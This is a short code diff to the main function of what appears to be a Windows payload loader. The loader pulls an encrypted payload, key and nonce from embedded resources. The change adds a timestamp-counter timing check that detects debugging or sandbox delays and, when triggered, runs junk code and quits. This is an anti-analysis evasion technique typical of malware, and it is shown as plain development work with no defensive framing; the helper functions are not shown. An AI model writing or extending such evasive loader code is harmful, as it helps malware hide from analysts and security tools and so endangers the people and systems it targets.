@@ -99,9 +99,17 @@ int main()
     res.key = GetResource(KEY_RESOURCE_ID, RT_RCDATA, &res.keySize);
     res.nonce = GetResource(NONCE_RESOURCE_ID, RT_RCDATA, &res.nonceSize);
 
+    DWORD64 qwStart = BeginDetectRDTSCBasedDelay();
+
     if ((res.payload == NULL || res.payloadSize == 0) ||
         (res.key == NULL || res.keySize != KEY_SIZE) ||
         (res.nonce == NULL || res.nonceSize != NONCE_SIZE)) {
+        return 1;
+    }
+
+    if (EndDetectRDTSCBasedDelay(qwStart, THRESHOLD_30000))
+    {
+        AddJunkCode();
         return 1;
     }
 
